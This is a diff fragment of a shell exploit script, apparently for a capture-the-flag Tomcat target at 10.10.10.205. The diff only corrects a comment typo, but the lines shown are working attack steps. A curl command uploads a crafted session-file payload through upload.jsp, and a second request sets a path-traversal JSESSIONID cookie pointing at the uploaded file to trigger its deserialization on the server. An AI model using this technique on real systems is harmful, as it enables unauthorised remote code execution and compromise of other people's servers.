@@ -355,7 +355,7 @@ echo $file
 #upload the payload
 curl -s -F "data=@/tmp/$file.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
 
-#reference paylaod in cookie
+#reference payload in cookie
 curl -s  -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$file" http://10.10.10.205:8080/ > /dev/null
 
 
